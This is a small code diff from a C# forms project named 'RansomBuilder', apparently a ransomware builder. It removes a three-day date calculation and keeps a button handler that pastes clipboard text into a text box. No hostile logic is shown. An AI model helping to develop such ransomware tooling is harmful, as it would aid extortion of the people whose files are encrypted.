@@ -291,9 +291,7 @@ namespace RansomBuilder
         }
         private void button1_Click(object sender, EventArgs e)
         {
-            DateTime baslangic = DateTime.Now.ToLocalTime();
-            DateTime bitis = baslangic.AddDays(3);
-            MessageBox.Show(bitis.ToString("HH:mm:ss dd/MM/yyyy"));
+          
             textBox1.Text = Clipboard.GetText();
        
         }
